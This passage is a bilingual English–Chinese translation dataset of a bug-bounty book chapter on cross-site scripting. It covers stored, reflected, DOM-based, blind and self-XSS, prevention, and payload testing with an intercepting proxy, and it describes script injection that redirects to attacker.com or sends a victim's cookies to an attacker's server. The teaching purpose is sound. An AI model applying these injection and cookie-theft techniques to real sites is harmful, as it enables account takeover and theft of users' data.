- en: '6'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '6'
- en: Cross-Site Scripting
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 跨站脚本攻击
- en: '![](image_fi/book_art/chapterart.png)'
  id: totrans-2
  prefs: []
  type: TYPE_IMG
  zh: '![](image_fi/book_art/chapterart.png)'
- en: Let’s start with *cross-site scripting (**XSS**)*, one of the most common bugs
    reported to bug bounty programs. It’s so prevalent that, year after year, it shows
    up in OWASP’s list of the top 10 vulnerabilities threatening web applications.
    It’s also HackerOne’s most reported vulnerability, with more than $4 million paid
    out in 2020 alone.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们从*跨站脚本攻击（**XSS**）*开始，它是报告给漏洞奖励计划中最常见的错误之一。它的普遍性如此之高，以至于每年它都会出现在OWASP列出的十大威胁网页应用的漏洞中。它也是HackerOne报告次数最多的漏洞，仅2020年就支付了超过400万美元的奖励。
- en: An XSS vulnerability occurs when attackers can execute custom scripts on a victim’s
    browser. If an application fails to distinguish between user input and the legitimate
    code that makes up a web page, attackers can inject their own code into pages
    viewed by other users. The victim’s browser will then execute the malicious script,
    which might steal cookies, leak personal information, change site contents, or
    redirect the user to a malicious site. These malicious scripts are often JavaScript
    code but can also be HTML, Flash, VBScript, or anything written in a language
    that the browser can execute.
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: XSS漏洞发生在攻击者能够在受害者的浏览器上执行自定义脚本时。如果应用程序未能区分用户输入和构成网页的合法代码，攻击者就能将自己的代码注入到其他用户查看的页面中。受害者的浏览器将执行这个恶意脚本，可能会窃取Cookies、泄露个人信息、修改网站内容，或将用户重定向到恶意网站。这些恶意脚本通常是JavaScript代码，但也可以是HTML、Flash、VBScript或任何浏览器能够执行的语言编写的代码。
- en: In this chapter, we’ll dive into what XSS vulnerabilities are, how to exploit
    them, and how to bypass common protections. We’ll also discuss how to escalate
    XSS vulnerabilities when you find one.
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将深入探讨XSS漏洞是什么，如何利用这些漏洞，以及如何绕过常见的防护措施。我们还将讨论在发现XSS漏洞时如何进行升级。
- en: Mechanisms
  id: totrans-6
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 机制
- en: In an XSS attack, the attacker injects an executable script into HTML pages
    viewed by the user. This means that to understand XSS, you’ll have to first understand
    JavaScript and HTML syntax.
  id: totrans-7
  prefs: []
  type: TYPE_NORMAL
  zh: 在XSS攻击中，攻击者将可执行脚本注入到用户查看的HTML页面中。这意味着，要理解XSS，首先需要理解JavaScript和HTML语法。
- en: 'Web pages are made up of HTML code whose elements describe the page’s structure
    and contents. For example, an `<h1>` tag defines a web page’s header, and a `<p>`
    tag represents a paragraph of text. The tags use corresponding closing tags, like
    `</h1>` and `</p>`, to indicate where the contents of the element should end.
    To see how this works, save this code in a file named *test.html*:'
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: 网页由HTML代码构成，其元素描述了页面的结构和内容。例如，`<h1>`标签定义了网页的头部，而`<p>`标签代表一段文本。标签使用相应的结束标签，如`</h1>`和`</p>`，来指示元素内容的结束位置。为了了解这个是如何工作的，可以将以下代码保存为名为*test.html*的文件：
- en: '[PRE0]'
  id: totrans-9
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: Now open it with your web browser. You can do this by right-clicking the HTML
    file, clicking **Open With**, and then selecting your preferred web browser, like
    Google Chrome, Mozilla Firefox, or Microsoft Internet Explorer. Or you can simply
    open your web browser and drag the HTML file into the browser window. You should
    see a simple web page like [Figure 6-1](#figure6-1).
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，用你的网页浏览器打开该文件。你可以通过右键点击HTML文件，选择**用...打开**，然后选择你喜欢的浏览器，如Google Chrome、Mozilla
    Firefox或Microsoft Internet Explorer，来打开它。或者，你也可以直接打开浏览器并将HTML文件拖进浏览器窗口。你应该能看到一个简单的网页，像[图6-1](#figure6-1)一样。
- en: '![f06001](image_fi/501546c06/f06001.png)'
  id: totrans-11
  prefs: []
  type: TYPE_IMG
  zh: '![f06001](image_fi/501546c06/f06001.png)'
- en: 'Figure 6-1: Our simple HTML page rendered in a browser'
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 图6-1：我们在浏览器中渲染的简单HTML页面
- en: In addition to formatting text, HTML lets you embed images with `<img>` tags,
    create user-input forms with `<form>` tags, link to external pages with `<a>`
    tags, and perform many other tasks. A full tutorial on how to write HTML code
    is beyond the scope of this chapter, but you can use W3School’s tutorial ([https://www.w3schools.com/html/default.asp](https://www.w3schools.com/html/default.asp))
    as a resource.
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 除了格式化文本外，HTML还允许你使用`<img>`标签嵌入图像，使用`<form>`标签创建用户输入表单，使用`<a>`标签链接到外部页面，以及执行许多其他任务。如何编写HTML代码的完整教程超出了本章的范围，但你可以参考W3School的教程（[https://www.w3schools.com/html/default.asp](https://www.w3schools.com/html/default.asp)）作为资源。
- en: 'HTML also allows the inclusion of executable scripts within HTML documents
    using `<script>` tags. Websites use these scripts to control client-side application
    logic and make the website interactive. For example, the following script generates
    a `Hello!` pop-up on the web page:'
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: HTML还允许在HTML文档中嵌入可执行脚本，使用`<script>`标签。网站使用这些脚本来控制客户端应用逻辑，并使网站具有互动性。例如，以下脚本会在网页上生成一个`Hello!`的弹窗：
- en: '[PRE1]'
  id: totrans-15
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: 'Scripts like this one that are embedded within an HTML file instead of loaded
    from a separate file are called *inline scripts*. These scripts are the cause
    of many XSS vulnerabilities. (Besides embedding a script inside the HTML page
    as an inline script, sites can also load JavaScript code as an external file,
    like this: `<script src="``URL_OF_EXTERNAL_SCRIPT``"></script>`.)'
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
- en: To see why, let’s say that our site contains an HTML form that allows visitors
    to subscribe to a newsletter ([Figure 6-2](#figure6-2)).
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
- en: '![f06002](image_fi/501546c06/f06002.png)'
  id: totrans-18
  prefs: []
  type: TYPE_IMG
- en: 'Figure 6-2: Our HTML page with an HTML form'
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
- en: 'The source HTML code of the page looks like this:'
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  id: totrans-21
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: After a visitor inputs an email address, the website confirms it by displaying
    it on the screen ([Figure 6-3](#figure6-3)).
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
- en: '![f06003](image_fi/501546c06/f06003.png)'
  id: totrans-23
  prefs: []
  type: TYPE_IMG
- en: 'Figure 6-3: The confirmation message after a visitor subscribes to our newsletter'
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
- en: 'The HTML that generates the confirmation message looks like this; HTML `<b>`
    tags indicate boldface text:'
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE3]'
  id: totrans-26
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: 'The page constructs the message by using user input. Now, what if a user decides
    to input a script instead of an email address in the email form? For instance,
    a script that sets the `location` of a web page will make the browser redirect
    to the location specified:'
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE4]'
  id: totrans-28
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: The attacker could enter this script into the email form field and click Submit
    ([Figure 6-4](#figure6-4)).
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
- en: '![f06004](image_fi/501546c06/f06004.png)'
  id: totrans-30
  prefs: []
  type: TYPE_IMG
- en: 'Figure 6-4: An attacker can enter a script instead of an email in the input
    field.'
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
- en: 'If the website doesn’t validate or sanitize the user input before constructing
    the confirmation message, the page source code would become the following:'
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE5]'
  id: totrans-33
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: '*Validating* user input means that the application checks that the user input
    meets a certain standard—in this case, does not contain malicious JavaScript code.
    *Sanitizing* user input, on the other hand, means that the application modifies
    special characters in the input that can be used to interfere with HTML logic
    before further processing.'
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
- en: 'As a result, the inline script would cause the page to redirect to *attacker.com*.
    XSS happens when attackers can inject scripts in this manner onto a page that
    another user is viewing. The attacker can also use a different syntax to embed
    malicious code. The `src` attribute of the HTML `<script>` tag allows you to load
    JavaScript from an external source. This piece of malicious code will execute
    the contents of *http://attacker.com/xss.js/* on the victim’s browser during an
    XSS attack:'
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE6]'
  id: totrans-36
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: 'This example isn’t really exploitable, because attackers have no way of injecting
    the malicious script on other users’ pages. The most they could do is redirect
    themselves to the malicious page. But let’s say that the site also allows users
    to subscribe to the newsletter by visiting the URL *https://subscribe.example.com?email=SUBSCRIBER_EMAIL*.
    After users visit the URL, they will be automatically subscribed, and the same
    confirmation will be shown on the web page. In this case, attackers can inject
    the script by tricking users into visiting a malicious URL:'
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE7]'
  id: totrans-38
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: 'Since the malicious script gets incorporated into the page, the victim’s browser
    will think the script is part of that site. Then the injected script can access
    any resources that the browser stores for that site, including cookies and session
    tokens. Attackers can, therefore, use these scripts to steal information and bypass
    access control. For example, attackers might steal user cookies by making the
    victim’s browser send a request to the attacker’s IP with the victim’s cookie
    as a URL parameter:'
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE8]'
  id: totrans-40
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: This script contains JavaScript code to load an image from the attacker’s server,
    with the user’s cookies as part of the request. The browser will send a GET request
    to the attacker’s IP, with the URL parameter `c` (for *cookie*) containing the
    user’s `document.cookie`, which is the victim user’s cookie on the current site.
    In this way, attackers can use the XSS to steal other users’ cookies by inspecting
    incoming requests on their server logs. Note that if the session cookie has the
    `HttpOnly` flag set, JavaScript will not be able to read the cookie, and therefore
    the attacker will not be able to exfiltrate it. Nevertheless, XSS can be used
    to execute actions on the victim’s behalf, modify the web page the victim is viewing,
    and read the victim’s sensitive information, such as CSRF tokens, credit card
    numbers, and any other details rendered on their page.
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
- en: Types of XSS
  id: totrans-42
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'There are three kinds of XSS: stored XSS, reflected XSS, and DOM-based XSS.
    The difference between these types is in how the XSS payload travels before it
    gets delivered to the victim user. Some XSS flaws also fall into special categories:
    blind XSS and self-XSS, which we’ll talk about in a bit.'
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
- en: Stored XSS
  id: totrans-44
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: '*Stored XSS* happens when user input is stored on a server and retrieved unsafely.
    When an application accepts user input without validation, stores it in its servers,
    and then renders it on users’ browsers without sanitization, malicious JavaScript
    code can make its way into the database and then to victims’ browsers.'
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
- en: Stored XSS is the most severe XSS type that we will discuss in this chapter,
    because it has the potential of attacking many more users than reflected, DOM,
    or self-XSS. Sometimes during a stored-XSS attack, all the user has to do to become
    a victim is to view a page with the payload embedded, whereas reflected and DOM
    XSS usually require the user to click a malicious link. Finally, self-XSS requires
    a lot of social engineering to succeed.
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
- en: During a stored XSS attack, attackers manage to permanently save their malicious
    scripts on the target application’s servers for others to access. Perhaps they’re
    able to inject the script in the application’s user database. Or maybe they get
    it in the server logs, on a message board, or in comment field. Every time users
    access the stored information, the XSS executes in their browser.
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
- en: For example, let’s say a comment field on an internet forum is vulnerable to
    XSS. When a user submits a comment to a blog post, that user input is not validated
    or sanitized in any way before it gets rendered to anyone who views that blog
    post. An attacker can submit a comment with JavaScript code and have that code
    executed by any user who views that blog post!
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
- en: 'A great proof of concept for XSS is to generate an alert box in the browser
    via injected JavaScript code, so let’s give that a try. The JavaScript code `alert(''XSS
    by Vickie'')` will generate a pop-up on the victim’s browser that reads `XSS by
    Vickie`:'
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE9]'
  id: totrans-50
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: 'If submitted, this message would become embedded on the forum page’s HTML code,
    and the page would be displayed to all the visitors who view that comment:'
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE10]'
  id: totrans-52
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: '[Figure 6-5](#figure6-5) shows the two messages rendered in a browser.'
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
- en: '![f06005](image_fi/501546c06/f06005.png)'
  id: totrans-54
  prefs: []
  type: TYPE_IMG
- en: 'Figure 6-5: The HTML page with two messages rendered in the browser. You can
    see that the attacker’s message is blank because the browser interprets it as
    a script instead of text.'
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
- en: When you load this HTML page in your browser, you’ll see the attacker’s comment
    field displayed as blank. This is because your browser interpreted `<script>alert('XSS
    by Vickie');</script>` located in the `<p>` tags as a script, not as regular text.
    You should notice a pop-up window that reads `XSS by Vickie`.
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
- en: Every time a user views the comment on the forum, their browser will execute
    the embedded JavaScript. Stored XSS tends to be the most dangerous because attackers
    can attack many victims with a single payload.
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
- en: Blind XSS
  id: totrans-58
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: '*Blind XSS* vulnerabilities are stored XSS vulnerabilities whose malicious
    input is stored by the server and executed in another part of the application
    or in another application that you cannot see.'
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
- en: For example, let’s say that a page on *example.com* allows you to send a message
    to the site’s support staff. When a user submits a message, that input is not
    validated or sanitized in any way before it gets rendered to the site’s admin
    page. An attacker can submit a message with JavaScript code and have that code
    executed by any admin who views that message.
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
- en: These XSS flaws are harder to detect, since you can’t find them by looking for
    reflected input in the server’s response, but they can be just as dangerous as
    regular stored XSS vulnerabilities. Often, blind XSS can be used to attack administrators,
    exfiltrate their data, and compromise their accounts.
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
- en: Reflected XSS
  id: totrans-62
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: '*Reflected XSS* vulnerabilities happen when user input is returned to the user
    without being stored in a database. The application takes in user input, processes
    it server-side, and immediately returns it to the user.'
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
- en: 'The first example I showed, with the email form, involved a reflected XSS attack.
    These issues often happen when the server relies on user input to construct pages
    that display search results or error messages. For example, let’s say a site has
    a search functionality. The user can input a search term via a URL parameter,
    and the page will display a message containing the term at the top of the results
    page. If a user searches *abc*, the source code for the related message might
    look like this:'
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE11]'
  id: totrans-65
  prefs: []
  type: TYPE_PRE
  zh: '[PRE11]'
- en: 'If the search functionality displays any user-submitted search string on the
    results page, a search term like the following would cause a script to become
    embedded on the results page and executed by the browser:'
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE12]'
  id: totrans-67
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: If an attacker can trick victims into visiting this URL, the payload will become
    embedded in their version of the page, making the victim’s browser run whatever
    code the attacker would like. Unlike stored XSS, which allows attackers to execute
    code on anyone who accesses their stored resources, reflected XSS enables attackers
    to execute code on the browsers of victims who click their malicious links.
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
- en: DOM-Based XSS
  id: totrans-69
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: '*DOM-based XSS* is similar to reflected XSS, except that in DOM-based XSS,
    the user input never leaves the user’s browser. In DOM-based XSS, the application
    takes in user input, processes it on the victim’s browser, and then returns it
    to the user.'
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
- en: 'The *Document Object Model (DOM)* is a model that browsers use to render a
    web page. The DOM represents a web page’s structure; it defines the basic properties
    and behavior of each HTML element, and helps scripts access and modify the contents
    of the page. DOM-based XSS targets a web page’s DOM directly: it attacks the client’s
    local copy of the web page instead of going through the server. Attackers are
    able to attack the DOM when a page takes user-supplied data and dynamically alters
    the DOM based on that input. JavaScript libraries like jQuery are prone to DOM-based
    XSS since they dynamically alter DOM elements.'
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
- en: As in reflected XSS, attackers submit DOM-based XSS payloads via the victim’s
    user input. Unlike reflected XSS, a DOM-based XSS script doesn’t require server
    involvement, because it executes when user input modifies the source code of the
    page in the browser directly. The XSS script is never sent to the server, so the
    HTTP response from the server won’t change.
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
- en: 'This might all sound a bit abstract, so let’s consider an example. Say a website
    allows the user to change their locale by submitting it via a URL parameter:'
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE13]'
  id: totrans-74
  prefs: []
  type: TYPE_PRE
  zh: '[PRE13]'
- en: 'The web page’s client-side code will use this locale to construct a welcome
    message whose HTML looks like this:'
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE14]'
  id: totrans-76
  prefs: []
  type: TYPE_PRE
  zh: '[PRE14]'
- en: 'The URL parameter isn’t submitted to the server. Instead, it’s used locally,
    by the user’s browser, to construct a web page by using a client-side script.
    But if the website doesn’t validate the user-submitted locale parameter, an attacker
    can trick users into visiting a URL like this one:'
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE15]'
  id: totrans-78
  prefs: []
  type: TYPE_PRE
  zh: '[PRE15]'
- en: The site will embed the payload on the user’s web page, and the victim’s browser
    will execute the malicious script.
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
- en: DOM XSS may sound a lot like reflected XSS at first. The difference is that
    the reflected XSS payload gets sent to the server and returned to the user’s browser
    within an HTTP response. On the other hand, the DOM XSS payload is injected onto
    a page because of client-side code rendering user input in an insecure manner.
    Although the results of the two attacks are similar, the processes of testing
    for them and protecting against them are different.
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
- en: 'The user input fields that can lead to reflected and DOM-based XSS aren’t always
    URL parameters. Sometimes they show up as URL fragments or pathnames. *URL fragments*
    are strings, located at the end of a URL, that begin with a `#` character. They
    are often used to automatically direct users to a section within a web page or
    transfer additional information. For example, this is a URL with a fragment that
    takes the user to the `#about_us` section of the site’s home page:'
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE16]'
  id: totrans-82
  prefs: []
  type: TYPE_PRE
  zh: '[PRE16]'
- en: We’ll talk more about the components of a URL in Chapter 7. For information
    about DOM XSS and some example payloads, see the PortSwigger article “DOM-Based
    XSS” at [https://portswigger.net/web-security/cross-site-scripting/dom-based/](https://portswigger.net/web-security/cross-site-scripting/dom-based/).
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
- en: Self-XSS
  id: totrans-84
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: '*Self-XSS attacks* require victims to input a malicious payload themselves.
    To perform these, attackers must trick users into doing much more than simply
    viewing a page or browsing to a particular URL.'
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
- en: For example, let’s say that a field on a user’s dashboard is vulnerable to stored
    XSS. But since only the victim can see and edit the field, there is no way for
    an attacker to deliver the payload unless the attacker can somehow trick the victim
    into changing the value of the field into the XSS payload.
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
- en: If you’ve ever seen social media posts or text messages telling you to paste
    a piece of code into your browser to “do something cool,” it was probably attack
    code aimed at tricking you into launching self-XSS against yourself. Attackers
    often embed a piece of malicious payload (usually via a shortened URL like *bitly.com*
    so victims won’t suspect anything) into a complicated-looking piece of code and
    use social media to fool unsuspecting users into attacking themselves.
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
- en: In bug bounties, self-XSS bugs are not usually accepted as valid submissions
    because they require social engineering. Bugs that require *social engineering*,
    or manipulation of the victims, are not usually accepted in bug bounty programs
    because they are not purely technical issues.
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 在漏洞悬赏中，通常不会接受自我 XSS 漏洞作为有效提交，因为它们需要社会工程学。需要 *社会工程学* 或操控受害者的漏洞通常不会在漏洞悬赏计划中被接受，因为这些问题不完全是技术问题。
- en: Prevention
  id: totrans-89
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 预防
- en: 'To prevent XSS, an application should implement two controls: robust input
    validation and contextual output escaping and encoding. Applications should never
    insert user-submitted data directly into an HTML document—including, for example,
    inside `<script>` tags, HTML tag names, or attribute names. Instead, the server
    should validate that user-submitted input doesn’t contain dangerous characters
    that might influence the way browsers interpret the information on the page. For
    example, user input containing the string `"<script>"` is a good indicator that
    the input contains an XSS payload. In this case, the server could block the request,
    or sanitize it by removing or escaping special characters before further processing.'
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 为了防止 XSS 攻击，应用程序应该实施两项控制措施：强健的输入验证和上下文输出转义与编码。应用程序绝不应直接将用户提交的数据插入到 HTML 文档中——例如，在
    `<script>` 标签内、HTML 标签名或属性名中。相反，服务器应该验证用户提交的输入是否包含可能影响浏览器解析页面信息的危险字符。例如，包含字符串`"<script>"`的用户输入是一个良好的指示，表明该输入包含
    XSS 有害负载。在这种情况下，服务器可以阻止该请求，或者通过删除或转义特殊字符来清理输入，然后再进行进一步处理。
- en: '*Escaping* refers to the practice of encoding special characters so that they
    are interpreted literally instead of as a special character by the programs or
    machines that process the characters. There are different ways of encoding a character.
    Applications will need to encode the user input based on where it will be embedded.
    If the user input is inserted into `<script>` tags, it needs to be encoded in
    JavaScript format. The same goes for input inserted into HTML, XML, JSON, and
    CSS files.'
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: '*转义*是指将特殊字符进行编码，以便它们被处理字符的程序或机器按字面意思解读，而不是作为特殊字符。编码字符的方法有多种。应用程序需要根据用户输入将其编码为不同格式，具体取决于输入将嵌入的位置。如果用户输入被插入到
    `<script>` 标签中，则需要以 JavaScript 格式进行编码。插入 HTML、XML、JSON 和 CSS 文件中的输入也同样如此。'
- en: In the context of our example, the application needs to encode special characters
    into a format used by HTML documents. For example, the left and right angle brackets
    can be encoded into HTML characters `&lt` and `&gt`. To prevent XSS, the application
    should escape characters that have special meaning in HTML, such as the `&` character,
    the angle brackets `<` and `>`, single and double quotes, and the forward-slash
    character.
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们示例的上下文中，应用程序需要将特殊字符编码为 HTML 文档所使用的格式。例如，左尖括号和右尖括号可以编码为 HTML 字符 `&lt` 和 `&gt`。为了防止
    XSS，应用程序应该转义在 HTML 中具有特殊含义的字符，如 `&` 字符、尖括号 `<` 和 `>`、单引号和双引号，以及斜杠字符 `/`。
- en: Escaping ensures that browsers won’t misinterpret these characters as code to
    execute. This is what most modern applications do to prevent XSS. The application
    should do this for every piece of user input that will be rendered or accessed
    by a user’s browser. Many modern JavaScript frameworks such as React, Angular
    2+, and Vue.js automatically do this for you, so many XSS vulnerabilities can
    be prevented by choosing the right JavaScript framework to use.
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 转义确保浏览器不会误将这些字符解读为执行的代码。这是大多数现代应用程序防止 XSS 攻击的做法。应用程序应该对每个用户输入的内容进行这种转义，以防该内容被用户的浏览器渲染或访问。许多现代
    JavaScript 框架，如 React、Angular 2+ 和 Vue.js，都会自动为你处理这个问题，因此通过选择合适的 JavaScript 框架，很多
    XSS 漏洞都能得到防范。
- en: The prevention of DOM-based XSS requires a different approach. Since the malicious
    user input won’t pass through the server, sanitizing the data that enters and
    departs from the server won’t work. Instead, applications should avoid code that
    rewrites the HTML document based on user input, and the application should implement
    client-side input validation before it is inserted into the DOM.
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 防止基于 DOM 的 XSS 需要不同的方法。由于恶意用户输入不会通过服务器，因此清理进出服务器的数据无法起作用。相反，应用程序应避免基于用户输入重写
    HTML 文档的代码，并且应用程序应该在输入被插入到 DOM 中之前实施客户端输入验证。
- en: You can also take measures to mitigate the impact of XSS flaws if they do happen.
    First, you can set the `HttpOnly` flag on sensitive cookies that your site uses.
    This prevents attackers from stealing those cookies via XSS. You should also implement
    the `Content-Security-Policy` HTTP response header. This header lets you restrict
    how resources such as JavaScript, CSS, or images load on your web pages. To prevent
    XSS, you can instruct the browser to execute only scripts from a list of sources.
    For more information about preventing XSS attacks, visit the OWASP XSS prevention
    cheat sheet, [https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
- en: Hunting for XSS
  id: totrans-96
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'Look for XSS in places where user input gets rendered on a page. The process
    will vary for the different types of XSS, but the central principle remains the
    same: check for reflected user input.'
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
- en: 'In this section, we’ll hunt for XSS in web applications. But it’s important
    to remember that XSS vulnerabilities can also arise outside normal web applications.
    You can hunt for XSS in applications that communicate via non-HTTP protocols such
    as SMTP, SNMP, and DNS. Sometimes commercial apps such as email apps and other
    desktop apps receive data from these protocols. If you are interested in these
    techniques, you can check out Offensive Security’s Advanced Web Attacks and Exploitation
    training: [https://www.offensive-security.com/awae-oswe/](https://www.offensive-security.com/awae-oswe/).'
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
- en: Before you start hunting for any vulnerability, it’s good to have Burp Suite
    or your preferred proxy on standby. Make sure you’ve configured your proxy to
    work with your browser. You can find instructions on how to do that in Chapter
    4.
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
- en: 'Step 1: Look for Input Opportunities'
  id: totrans-100
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: First, look for opportunities to submit user input to the target site. If you’re
    attempting stored XSS, search for places where input gets stored by the server
    and later displayed to the user, including comment fields, user profiles, and
    blog posts. The types of user input that are most often reflected back to the
    user are forms, search boxes, and name and username fields in sign-ups.
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
- en: 'Don’t limit yourself to text input fields, either. Sometimes drop-down menus
    or numeric fields can allow you to perform XSS, because even if you can’t enter
    your payload on your browser, your proxy might let you insert it directly into
    the request. To do that, you can turn on your proxy’s traffic interception and
    modify the request before forwarding it to the server. For example, say a user
    input field seems to accept only numeric values on the web page, such as the `age`
    parameter in this `POST` request:'
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE17]'
  id: totrans-103
  prefs: []
  type: TYPE_PRE
  zh: '[PRE17]'
- en: 'You can still attempt to submit an XSS payload by intercepting the request
    via a web proxy and changing the input value:'
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE18]'
  id: totrans-105
  prefs: []
  type: TYPE_PRE
  zh: '[PRE18]'
- en: In Burp, you can edit the request directly in the Proxy tab ([Figure 6-6](#figure6-6)).
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
- en: '![f06006](image_fi/501546c06/f06006.png)'
  id: totrans-107
  prefs: []
  type: TYPE_IMG
- en: 'Figure 6-6: Intercept the outgoing request to edit it before relaying it to
    the server.'
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
- en: After you’re done editing, click **Forward** to forward the request to the server
    ([Figure 6-7](#figure6-7)).
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
- en: '![f06007](image_fi/501546c06/f06007.png)'
  id: totrans-110
  prefs: []
  type: TYPE_IMG
- en: 'Figure 6-7: Change the URL post request parameter to your XSS payload.'
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
- en: If you’re hoping to find reflected and DOM XSS, look for user input in URL parameters,
    fragments, or pathnames that get displayed to the user. A good way to do this
    is to insert a custom string into each URL parameter and check whether it shows
    up in the returned page. Make this string specific enough that you’ll be sure
    your input caused it if you see it rendered. For example, I like to use the string
    `"XSS_BY_VICKIE"`. Insert your custom string into every user-input opportunity
    you can find. Then, when you view the page in the browser, search the page’s source
    code for it (you can access a page’s source code by right-clicking a page and
    selecting View Source) by using your browser’s page-search functionality (usually
    triggered by pressing CTRL-F). This should give you an idea of which user input
    fields appear in the resulting web page.
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
- en: 'Step 2: Insert Payloads'
  id: totrans-113
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'Once you’ve identified the user-input opportunities present in an application,
    you can start entering a test XSS payload at the discovered injection points.
    The simplest payload to test with is an alert box:'
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE19]'
  id: totrans-115
  prefs: []
  type: TYPE_PRE
  zh: '[PRE19]'
- en: If the attack succeeds, you should see a pop-up on the page with the text `XSS
    by Vickie`.
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
- en: But this payload won’t work in typical web applications, save the most defenseless,
    because most websites nowadays implement some sort of XSS protection on their
